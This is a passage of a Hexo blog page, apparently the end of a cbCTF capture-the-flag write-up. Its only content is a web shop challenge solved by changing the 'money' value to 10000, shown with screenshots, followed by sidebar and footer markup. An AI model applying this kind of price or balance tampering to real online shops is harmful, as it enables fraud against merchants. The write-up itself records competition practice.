+<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="尖尖的商店"><a href="#尖尖的商店" class="headerlink" title="尖尖的商店"></a>尖尖的商店</h3><p><img src="/image/cbctf/web.png" alt="web"></p>
+<p>修改money为10000</p>
+<p><img src="/image/cbctf/flag.png" alt="flag"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/07/24/xctf-adv/" rel="next" title="xctf-adv">
+                <i class="fa fa-chevron-left"></i> xctf-adv
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head.jpg"
+                alt="caiii-vegtable" />
+            
+              <p class="site-author-name" itemprop="name">caiii-vegtable</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/%20%7C%7C%20archive">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+
+          </nav>
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#cbCTF"><span class="nav-text">cbCTF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sign-in"><span class="nav-text">sign_in</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#α层"><span class="nav-text">α层</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PWN"><span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#backdoor"><span class="nav-text">backdoor</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#suggestion-box"><span class="nav-text">suggestion box</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#check-in"><span class="nav-text">check_in</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#warm-up"><span class="nav-text">warm_up</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ezrsa"><span class="nav-text">ezrsa</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web"><span class="nav-text">web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#尖尖的商店"><span class="nav-text">尖尖的商店</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">caiii-vegtable</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
